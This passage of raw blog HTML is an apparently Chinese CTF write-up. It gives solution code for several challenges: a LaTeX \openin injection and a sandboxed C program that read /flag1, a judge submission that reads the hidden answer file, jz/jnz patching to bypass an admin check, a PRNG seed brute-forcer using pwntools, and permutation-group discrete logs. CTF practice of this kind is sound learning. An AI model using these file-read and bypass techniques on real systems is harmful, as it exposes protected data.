class=\"line\">    <span class=\"keyword\">await</span> page.<span class=\"built_in\">type</span>(<span class=\"string\">&#x27;#captcha3&#x27;</span>, <span class=\"built_in\">str</span>(res3))</span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.click(<span class=\"string\">&#x27;#submit&#x27;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    flag = <span class=\"keyword\">await</span> page.querySelectorEval(<span class=\"string\">&#x27;body &gt; div &gt; p:nth-child(4)&#x27;</span>, <span class=\"string\">&#x27;node =&gt; node.innerText&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">    <span class=\"keyword\">await</span> browser.close()</span><br><span class=\"line\">asyncio.get_event_loop().run_until_complete(main())</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"旅行照片2-0\"><a href=\"#旅行照片2-0\" class=\"headerlink\" title=\"旅行照片2.0\"></a>旅行照片2.0</h2><p>Level1 直接用在线网站就能看，但 EXIF 版本信息显示是 <code>0231</code> ，结合题目提示，改成 <code>2.31</code> 就行。<br>Level2 一开始谷歌和百度识图都出不来，然后发现识图的结果都是夕阳，于是把图片<strong>截去夕阳部分</strong>再谷歌识图，就能得到拍摄角度几乎一样但是白天的日本千叶市美滨区的海洋球场，然后找机场就找头疼了，放弃。<br>在做复变函数的时候无意间发现 wolfram 可以通过看到飞机的地点和时间直接查询航班，但是是会员功能。</p>\n<h2 id=\"猜数字（未解出）\"><a href=\"#猜数字（未解出）\" class=\"headerlink\" title=\"猜数字（未解出）\"></a>猜数字（未解出）</h2><p>写了个脚本暴猜一晚上没出，果然运气还是太差了。<br>正解是 <code>NaN</code> ，不提。<br>这里贴一下我爆破的脚本，供君一乐：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests <span class=\"keyword\">as</span> r</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://202.38.93.111:18000/state&#x27;</span></span><br><span class=\"line\">cookie = <span class=\"string\">&#x27;&lt;your_cookie&gt;&#x27;</span></span><br><span class=\"line\">auth = <span class=\"string\">&#x27;&lt;your_auth&gt;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">guess</span>(<span class=\"params\">num</span>):</span><br><span class=\"line\">    data = <span class=\"string\">f&#x27;&lt;state&gt;&lt;guess&gt;<span class=\"subst\">&#123;num&#125;</span>&lt;/guess&gt;&lt;/state&gt;&#x27;</span></span><br><span class=\"line\">    r.post(url, headers=&#123;<span class=\"string\">&#x27;Cookie&#x27;</span>: cookie, <span class=\"string\">&#x27;authorization&#x27;</span>: auth&#125;, data=data)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check</span>():</span><br><span class=\"line\">    res = r.get(url, headers=&#123;<span class=\"string\">&#x27;Cookie&#x27;</span>: cookie, <span class=\"string\">&#x27;authorization&#x27;</span>: auth&#125;)</span><br><span class=\"line\">    resp = re.findall(<span class=\"string\">r&#x27;&lt;guess less=&quot;(\\w+)&quot; more=&quot;(\\w+)&quot;&gt;(.*?)&lt;/guess&gt;&#x27;</span>, res.text)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> resp:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"string\">&#x27;true&#x27;</span>, <span class=\"string\">&#x27;true&#x27;</span>, <span class=\"string\">&#x27;0&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> resp[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">crack</span>(<span class=\"params\">n</span>):</span><br><span class=\"line\">    guess(<span class=\"built_in\">str</span>(n/<span class=\"number\">1000000</span>))</span><br><span class=\"line\">    less, more, num = check()</span><br><span class=\"line\">    <span class=\"comment\"># print(less, more, num)</span></span><br><span class=\"line\">    left = <span class=\"number\">0</span></span><br><span class=\"line\">    right = <span class=\"number\">1000000</span></span><br><span class=\"line\">    times = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> less != <span class=\"string\">&#x27;true&#x27;</span> <span class=\"keyword\">or</span> more != <span class=\"string\">&#x27;true&#x27;</span>:</span><br><span class=\"line\">        times += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> less == <span class=\"string\">&#x27;true&#x27;</span>:</span><br><span class=\"line\">            left = <span class=\"built_in\">float</span>(num)*<span class=\"number\">1000000</span></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> more == <span class=\"string\">&#x27;true&#x27;</span>:</span><br><span class=\"line\">            right = <span class=\"built_in\">float</span>(num)*<span class=\"number\">1000000</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        num = (left + right) // <span class=\"number\">2</span></span><br><span class=\"line\">        tmp = num</span><br><span class=\"line\">        guess(<span class=\"built_in\">str</span>(num/<span class=\"number\">1000000</span>))</span><br><span class=\"line\">        less, more, num = check()</span><br><span class=\"line\">        <span class=\"comment\"># print(less, more, num)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> times, tmp</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    l = [<span class=\"number\">500000</span>]</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"comment\"># n = 500000*(len(l)+1) - sum(l)</span></span><br><span class=\"line\">        <span class=\"comment\"># n = min(n, 1000000)</span></span><br><span class=\"line\">        <span class=\"comment\"># n = max(n, 0)</span></span><br><span class=\"line\">        n = <span class=\"number\">1000000</span> - <span class=\"built_in\">sum</span>(l)//<span class=\"built_in\">len</span>(l)</span><br><span class=\"line\">        times, num = crack(n)</span><br><span class=\"line\">        l.append(<span class=\"built_in\">int</span>(num))</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(times, n, num, <span class=\"built_in\">sum</span>(l)//<span class=\"built_in\">len</span>(l))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> times == <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;done&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"LaTeX机器人\"><a href=\"#LaTeX机器人\" class=\"headerlink\" title=\"LaTeX机器人\"></a>LaTeX机器人</h2><p>Level1 我的解法：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">\\newread</span><span class=\"keyword\">\\myread</span> <span class=\"keyword\">\\openin</span><span class=\"keyword\">\\myread</span>=/flag1 <span class=\"keyword\">\\read</span><span class=\"keyword\">\\myread</span> to <span class=\"keyword\">\\fileline</span> <span class=\"keyword\">\\fileline</span>&#123;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Level2 打不通，但找到一个可以取消所有转义的函数 <del>（但我忘了是什么）</del>。</p>\n<h2 id=\"安全的在线测评\"><a href=\"#安全的在线测评\" class=\"headerlink\" title=\"安全的在线测评\"></a>安全的在线测评</h2><p>我 Level1 的解法，但似乎预期是用编译器读？</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// read 2 lines from file</span></span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">400</span>];</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>, buf);</span><br><span class=\"line\"></span><br><span class=\"line\">    FILE *fp = fopen(<span class=\"string\">&quot;./data/static.out&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    fgets(buf, <span class=\"number\">400</span>, fp);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s&quot;</span>, buf);</span><br><span class=\"line\">    fgets(buf, <span class=\"number\">400</span>, fp);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s&quot;</span>, buf);</span><br><span class=\"line\">    fclose(fp);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Flag自动机\"><a href=\"#Flag自动机\" class=\"headerlink\" title=\"Flag自动机\"></a>Flag自动机</h2><p>第一回正式打逆向，首先题目是一个恶作剧程序，就是不给点 <code>狠心夺取</code> 按钮，于是拖进 <code>IDA</code> 看到有 <code>rand</code> 函数，不难联想到按钮的新位置是通过这个函数产生的，于是再查看 <code>rand</code> 函数的调用，发现只有两处——分别是按钮的 X 坐标和 Y 坐标。然后我的解法是把汇编上把位置 patch 成 <code>0</code> ，这样按钮就只刷新在左上角了。点击按钮后，弹出一个提示框——<code>获取flag失败！您不是本机的“超级管理员”！</code> ，于是再次在 <code>IDA</code> 找到一个判断，若该变量不等于 <code>114514</code> ，则弹出失败的提示框，这里在汇编把 <code>jz</code> patch 成 <code>jnz</code> 就行。最后成功获取 flag 。</p>\n<h2 id=\"杯窗鹅影\"><a href=\"#杯窗鹅影\" class=\"headerlink\" title=\"杯窗鹅影\"></a>杯窗鹅影</h2><p>Level1 我的解法如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// read file in /flag1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span> &#123;</span><br><span class=\"line\">    FILE *fp = fopen(<span class=\"string\">&quot;/flag1&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (fp == <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;open file failed&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">    fgets(buf, <span class=\"number\">0x100</span>, fp);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s&quot;</span>, buf);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"蒙特卡洛轮盘赌\"><a href=\"#蒙特卡洛轮盘赌\" class=\"headerlink\" title=\"蒙特卡洛轮盘赌\"></a>蒙特卡洛轮盘赌</h2><p>测试得出 <code>clock()</code> 的大小在 1000 左右，那么假定时间基本同步的情况下爆破 1000 次左右即可出结果。<br>编译开 <code>-O3</code> 的情况下目测大约每秒 20 次，大约在 50s 内可出结果。<br>代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> subprocess</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># compile the c program</span></span><br><span class=\"line\">os.system(<span class=\"string\">&#x27;gcc -o setseed setseed.c -O3&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">seedtores</span>(<span class=\"params\">seed</span>):</span><br><span class=\"line\">    p = subprocess.run(</span><br><span class=\"line\">            [<span class=\"string\">&#x27;./setseed&#x27;</span>, <span class=\"built_in\">str</span>(seed)],</span><br><span class=\"line\">            stdout=subprocess.PIPE,</span><br><span class=\"line\">            stderr=subprocess.STDOUT</span><br><span class=\"line\">        )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (p.stdout.decode()).split()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">crack</span>(<span class=\"params\">pi2, t</span>):</span><br><span class=\"line\">    p1, p2 = pi2</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        res = seedtores(t)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(res[<span class=\"number\">0</span>],res[<span class=\"number\">1</span>], res[<span class=\"number\">2</span>], end=<span class=\"string\">&#x27;\\r&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> res[<span class=\"number\">1</span>] == p1 <span class=\"keyword\">and</span> res[<span class=\"number\">2</span>] == p2:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> t, res</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            t += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">now = <span class=\"built_in\">int</span>(time.time())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(now)</span><br><span class=\"line\"></span><br><span class=\"line\">r = remote(<span class=\"string\">&#x27;202.38.93.111&#x27;</span>, <span class=\"number\">10091</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">token = <span class=\"string\">b&#x27;&lt;your_token&gt;&#x27;</span></span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">b&#x27;token:&#x27;</span>, token)</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&#x27;请输入你的猜测（如 3.14159，输入后回车）：&#x27;</span>.encode(), <span class=\"string\">b&#x27;0&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;正确答案是：&#x27;</span>.encode())</span><br><span class=\"line\">p1 = r.recvline().decode().strip()</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&#x27;请输入你的猜测（如 3.14159，输入后回车）：&#x27;</span>.encode(), <span class=\"string\">b&#x27;0&#x27;</span>)</span><br><span class=\"line\">r.recvuntil(<span class=\"string\">&#x27;正确答案是：&#x27;</span>.encode())</span><br><span class=\"line\">p2 = r.recvline().decode().strip()</span><br><span class=\"line\"></span><br><span class=\"line\">info(<span class=\"string\">&#x27;p1: %s, p2: %s&#x27;</span>, p1, p2)</span><br><span class=\"line\">t, guess = crack((p1, p2), now)</span><br><span class=\"line\">success(<span class=\"string\">&#x27;guess: %s&#x27;</span>, guess)</span><br><span class=\"line\"></span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&#x27;请输入你的猜测（如 3.14159，输入后回车）：&#x27;</span>.encode(), guess[<span class=\"number\">3</span>].encode())</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&#x27;请输入你的猜测（如 3.14159，输入后回车）：&#x27;</span>.encode(), guess[<span class=\"number\">4</span>].encode())</span><br><span class=\"line\">r.sendlineafter(<span class=\"string\">&#x27;请输入你的猜测（如 3.14159，输入后回车）：&#x27;</span>.encode(), guess[<span class=\"number\">5</span>].encode())</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.recvlines(<span class=\"number\">3</span>))</span><br></pre></td></tr></table></figure>\n\n<p>其中 <code>setseed.c</code> 代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;time.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">double</span> <span class=\"title function_\">rand01</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"type\">double</span>)rand() / RAND_MAX;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// let main receive a seed</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">// disable buffering</span></span><br><span class=\"line\">    setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"literal\">NULL</span>, _IONBF, <span class=\"number\">0</span>);</span><br><span class=\"line\">    setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>, _IONBF, <span class=\"number\">0</span>);</span><br><span class=\"line\">    setvbuf(<span class=\"built_in\">stderr</span>, <span class=\"literal\">NULL</span>, _IONBF, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> seed = <span class=\"number\">1666610168</span>+<span class=\"number\">946</span>;</span><br><span class=\"line\">    seed = atoi(argv[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%u\\n&quot;</span>,seed);</span><br><span class=\"line\">    srand(seed<span class=\"number\">-1</span>);</span><br><span class=\"line\">    <span class=\"type\">int</span> games = <span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> win = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> lose = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> target[<span class=\"number\">20</span>];</span><br><span class=\"line\">    <span class=\"type\">char</span> guess[<span class=\"number\">2000</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = games; i &gt; <span class=\"number\">0</span>; i--) &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> M = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> N = <span class=\"number\">400000</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> j = <span class=\"number\">0</span>; j &lt; N; j++) &#123;</span><br><span class=\"line\">            <span class=\"type\">double</span> x = rand01();</span><br><span class=\"line\">            <span class=\"type\">double</span> y = rand01();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (x*x + y*y &lt; <span class=\"number\">1</span>) M++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"type\">double</span> pi = (<span class=\"type\">double</span>)M / N * <span class=\"number\">4</span>;</span><br><span class=\"line\">        <span class=\"built_in\">sprintf</span>(target, <span class=\"string\">&quot;%1.5f&quot;</span>, pi);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%1.5f\\n&quot;</span>, pi);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"置换魔群\"><a href=\"#置换魔群\" class=\"headerlink\" title=\"置换魔群\"></a>置换魔群</h2><p>打通了，还行。<br>置换群的概念题目已经说得很清楚了，这里不再赘述。<br>Level1 是生成一个置换群 $A_n$ ，并给出 $x^e$ 和 $e=66537$ ，求群 $A_n$ 的元素 $x$ 。<br>那么这就很类似 RSA 了，首先 RSA 的解密原理是，对于模 $n$ 群，对其中的<strong>任意元素</strong> $x$ ，都有 $x^{\\varphi(n)}\\equiv1\\mod n$ ，这里的$\\varphi(n)$称为<strong>群的阶</strong>。所以 $m^{ed}\\equiv m^{k\\varphi(n)+1}\\equiv (m^{\\varphi})^km\\equiv m\\mod n$ 。（srds，这竟然是我在做这道题的时候推公式想明白的）<br>那么回到这个题就很简单了，只需求出 $A_n$ 的阶，然后取 $e$ 模 $A_n$ 阶的逆元就能得到解密指数 $d$ 了。<br>题目给了简陋的求群的阶的函数，但速度比较慢，用 sagemath 实现了一下，快了很多。<br>关键代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>(<span class=\"params\">n, c, e=<span class=\"number\">65537</span></span>):</span><br><span class=\"line\">    S = SymmetricGroup(n)</span><br><span class=\"line\">    d = <span class=\"built_in\">pow</span>(e, -<span class=\"number\">1</span>, S.order())</span><br><span class=\"line\">    res = S(c) ** <span class=\"built_in\">int</span>(d)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">str</span>(<span class=\"built_in\">list</span>(res.<span class=\"built_in\">tuple</span>()))   <span class=\"comment\"># 这里应该有更优雅的写法</span></span><br></pre></td></tr></table></figure>\n\n<p>Level2 同样生成一个置换群 $A_n$ ，给出一个元素 $g$ 和 $g^y$ ，要求 $y$ 。<br>那么这就是一个离散对数问题了，用 sagemath 的 <code>discrete_log</code> 函数就能解决。<br>当然如果你和我一样不知道 sagemath 的置换群用的哪个函数，可以使用万能的 copilot 直接先敲一行注释，然后回车按 <code>tab</code> 。<br>关键代码如下：（只有两行，乐）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">solve</span>(<span class=\"params\">g, y, n</span>):</span><br><span class=\"line\">    S = SymmetricGroup(n)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> discrete_log(S(y), S(g))</span><br></pre></td></tr></table></figure>\n\n<p>Level3 同样是离散对数问题，允许输入两个元素 $g_1$ 和 $g_2$ ，然后给出 $g_1^m$ 和 $g_2^m$ ，要求 $m$ 。<br>上面提到了<strong>群的阶</strong>，这里引入<strong>元素的阶</strong>的概念：比如模 $5$ 的群中，群的阶为 $\\varphi(5)=4$ ，也就是说 $1^4\\equiv2^4\\equiv3^4\\equiv4^4\\mod 5$ ，但是我们发现， $1^1 \\mod1$ 就已经是 $1$ 了， $4^2\\mod 5$ 也一样不需要达到 $4$ 次方就到 $1$ ，这里我们称<strong>最小的</strong> $k$ 使元素 $x$ 满足 $x^k\\equiv1\\mod n$ 为<strong>元素 $x$ 的阶</strong>，也就是说如上的例子中 $1$ 的阶为 $1$ ， $4$ 的阶为 $2$ 。<br>现在回到题目，我们发现难点在于要求的 $m$ 是比较大的，记 $g_1$ 和 $g_2$ 的阶分别为 $a$ 和 $b$ ，容易知道我们求离散对数得到的只是 $m_1\\equiv m\\mod a$ 和 $m_2\\equiv m\\mod b$ ，由中国剩余定理可知最后求出的 $m’\\equiv m\\mod \\mathrm{lcm}(a,b)$ ，也就是说，我们构造的 $g_1$ 和 $g_2$ 的阶的<strong>最小公倍数需要足够大</strong>才能得到 $m$ 。</p>\n<p>然后不难搜得求置换群元素的阶最大的问题可以转化成求一组数的和不超过 $n$ ，如果使这组数的最小公倍数最大的问题。显然这组数应该是互质的，但<strong>这并不意味着这组数要全为质数</strong>！比如 $n=7$ 时，我们可以得到 $3\\times4$ 是最大的， $3$ 和 $4$ 互质，但 $4$ 不是质数。如此我们可以手推几个，然后在数列网站 OEIS 上搜索得到数列<a href=\"https://oeis.org/A000793\">A000793</a>，关于这个数列的介绍为 <code>Landau&#39;s function g(n): largest order of permutation of n elements. Equivalently, largest LCM of partitions of n.</code><br>显然这正是我们要找的，于是复制下面给出的代码就可以生成 $g_1$ 了，而对于 $g_2$ ，我的做法是拿到 $g_2$ 中最大数后面的素数列填充进去，若不能继续填充且空间还有剩余，则使最后两个素数<strong>尽可能大且尽可能相近</strong>。<br>最后我的蹩脚算法得出来的界大部分比题目的界要大，有小部分小 $1/10$ 左右，基本上都能大过 $m$ 。</p>\n<p>贴一下完整的垃圾代码：</p>\n<figure class=\"highlight 